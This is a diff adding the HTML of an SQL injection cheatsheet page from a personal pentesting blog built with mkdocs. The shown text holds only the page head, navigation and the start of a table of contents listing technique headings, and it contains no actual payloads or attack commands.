@@ -1,0 +1,2166 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/references/cheatsheets/injection-attacks/SQL-injection/index.html">
+      
+      
+        <link rel="prev" href="../OS-command-injection/index.html">
+      
+      
+        <link rel="next" href="../../../methodologies/web-apps/owasp-wstg.html">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>SQL Injection - My Personal Site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="SQL Injection - My Personal Site" >
+      
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/references/cheatsheets/injection-attacks/SQL-injection/index.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://tomfieber.github.io/references/cheatsheets/injection-attacks/SQL-injection/index.html" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="SQL Injection - My Personal Site" >
+      
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/references/cheatsheets/injection-attacks/SQL-injection/index.png" >
+      
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Personal Site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About Me
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  References
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Personal Site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About Me
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../blog/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/archive/2024.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/tryhackme.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/vulnlab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulnlab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/writeups.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            References
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../NoSQL/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="index.html" class="md-nav__link md-nav__link--active">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP WSTG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#error-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Error-Based SQLi
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQLi
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#union-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      UNION-Based SQLi
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identifying-the-database" class="md-nav__link">
